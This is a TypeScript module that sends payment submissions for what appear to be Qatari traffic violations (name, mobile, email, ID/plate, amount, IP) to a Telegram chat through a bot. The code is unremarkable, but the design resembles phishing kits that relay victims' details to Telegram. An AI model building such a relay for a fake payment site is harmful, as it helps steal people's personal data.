import axios from 'axios';
import { env, isTelegramConfigured } from '../config/env';
import { logger } from '../utils/logger';
import { PaymentInput } from '../types';

interface TelegramSendResult {
  ok: boolean;
  messageId?: number;
}

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function buildMessage(payment: PaymentInput & { reference: string; ip?: string }): string {
  const lines = [
    '🚨 <b>New Payment Request</b>',
    '',
    `🧾 <b>Ref:</b> ${escapeHtml(payment.reference)}`,
    payment.referenceId ? `🔎 <b>Inquiry:</b> ${escapeHtml(payment.referenceId)}` : '',
    `👤 <b>Name:</b> ${escapeHtml(payment.fullName)}`,
    `📱 <b>Mobile:</b> ${escapeHtml(payment.mobile)}`,
    payment.email ? `✉️ <b>Email:</b> ${escapeHtml(payment.email)}` : '',
    payment.identifier ? `🪪 <b>ID / Plate:</b> ${escapeHtml(payment.identifier)}` : '',
    `💰 <b>Amount:</b> QAR ${payment.amount}`,
    payment.violationRefs?.length ? `📋 <b>Violations:</b> ${escapeHtml(payment.violationRefs.join(', '))}` : '',
    payment.notes ? `📝 <b>Notes:</b> ${escapeHtml(payment.notes)}` : '',
    `🌐 <b>Lang:</b> ${payment.language ?? 'en'}`,
    payment.ip ? `📡 <b>IP:</b> ${escapeHtml(payment.ip)}` : '',
    env.telegram.username ? `\n📨 Contact: ${escapeHtml(env.telegram.username)}` : '',
  ];
  return lines.filter(Boolean).join('\n');
}

export const telegramService = {
  /** Sends the payment submission to the configured Telegram chat. */
  async sendPayment(payment: PaymentInput & { reference: string; ip?: string }): Promise<TelegramSendResult> {
    if (!isTelegramConfigured) {
      logger.warn('Telegram not configured — skipping send. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.');
      return { ok: false };
    }

    const url = `https://api.telegram.org/bot${env.telegram.botToken}/sendMessage`;
    const { data } = await axios.post(
      url,
      {
        chat_id: env.telegram.chatId,
        text: buildMessage(payment),
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      },
      { timeout: 10000 }
    );

    return { ok: Boolean(data?.ok), messageId: data?.result?.message_id };
  },
};
